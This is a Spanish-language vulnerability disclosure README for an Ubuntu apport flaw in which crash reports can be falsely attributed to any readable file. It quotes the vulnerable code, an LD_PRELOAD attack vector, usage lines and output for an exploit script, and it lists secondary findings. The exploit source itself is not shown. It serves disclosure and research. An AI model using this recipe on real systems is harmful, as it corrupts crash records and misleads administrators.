# CVE-2026-XXXX: Apport ExecutablePath Spoofing

**Bug de integridad/metadata** en Ubuntu 24.04 LTS apport 2.28.1

---

## Descripción

Apport confía en `argv[1]` del proceso crash (`ProcCmdline`) para
sobrescribir `ExecutablePath` en el reporte, sin verificar que el
archivo corresponda al proceso que realmente crashéo.

**Archivo:** `/usr/lib/python3/dist-packages/apport/report.py:626-633`

```python
if os.access(cmdargs[1], os.R_OK):
    self["InterpreterPath"] = self["ExecutablePath"]
    self["ExecutablePath"] = os.path.realpath(cmdargs[1])
```

La única barrera es `os.access(path, os.R_OK)` — legibilidad, no
autenticidad. Un atacante local puede hacer que un crash de bash se
atribuya a cualquier archivo legible del sistema.

## Clasificación

| Tipo | ID |
|------|----|
| **CWE** | CWE-20 (Improper Input Validation) / CWE-345 (Insufficient Verification) |
| **CVSS v3.1** | 5.5 (AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L) |
| **Categoría** | Bug de integridad de metadata, **no** escalación de privilegios |

## Impacto real

| ¿Qué consigue? | ¿Qué NO consigue? |
|----------------|-------------------|
| Atribución falsa en crash reports y logs | Escalación de privilegios (LPE) |
| Core dump de bash atribuido a passwd/sudo | Ejecución remota (RCE) |
| Contaminación de telemetría (Launchpad) | Escritura fuera de `/var/crash/` |
| DoS parcial en `/var/crash/` | Ejecución de hooks como root |

**Por qué no es crítico:**

1. `drop_privileges(real_user)` se ejecuta antes del parsing
   (apport línea 1077 → 1080)
2. `add_proc_info()` y `_check_interpreted()` corren como el usuario
   del crash, no como root
3. `add_package_info()` también corre con privilegios reducidos
4. El filename del reporte usa `.replace("/", "_")`, impidiendo path
   traversal
5. `report_owner` es el usuario (dump_mode 1) para procesos normales

## Vector

```
LD_PRELOAD=.so /usr/bin/bash /usr/bin/passwd
  → bash crash (SIGILL/SIGSEGV)
  → apport procesa
  → _check_interpreted() ve que "bash" es intérprete
  → ExecutablePath = argv[1] = /usr/bin/passwd
  → reporte creado en /var/crash/_usr_bin_passwd.{uid}.crash
```

### Requisitos

- Apport activo (`systemctl is-active apport.service`)
- `ulimit -c unlimited`
- Shell como usuario no privilegiado

## Uso del exploit

```bash
ulimit -c unlimited
python3 exploit_apport.py                         # target: /usr/bin/passwd
python3 exploit_apport.py /usr/bin/su             # target personalizado
```

### Salida

```
[+] Reporte: ExecutablePath: /usr/bin/passwd     ← FALSIFICADO
[+] Reporte: InterpreterPath: /usr/bin/bash       ← REAL
```

### Verificación

```bash
cat /var/log/apport.log | grep "script:\|executable:"
grep ExecutablePath /var/crash/*.crash
```

## Archivos

| Archivo | Descripción |
|---------|-------------|
| `exploit_apport.py` | Exploit completo (Python, genera .so sin gcc) |
| `.libexploit.so` | .so crash (344B ELF64) |
| `poc_apport_override.py` | PoC básico solo Python |
| `pwn_apport.c` | C source alternativo (necesita gcc) |
| `CVE-REQUEST-*.md` | Reporte formal para MITRE |
| `*.crash` | Reportes de crash verificados |

## Hallazgos secundarios

| ID | Descripción | Línea |
|----|-------------|-------|
| H1 | Path traversal en `parse_arguments`: `replace("!", "/")` antes de filtrar `../` | `apport:750-757` |
| H3 | Falso positivo en `likely_packaged()` para `/var/tmp/` | `fileutils.py:136-158` |
| T1 | TOCTOU entre `os.access()` y `os.path.realpath()` en `_check_interpreted` | `report.py:631-633` |

## Referencias

- [CWE-20](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-345](https://cwe.mitre.org/data/definitions/345.html)
- [CVE-2019-15790](https://nvd.nist.gov/vuln/detail/CVE-2019-15790)
- [CVE-2020-11935](https://nvd.nist.gov/vuln/detail/CVE-2020-11935)
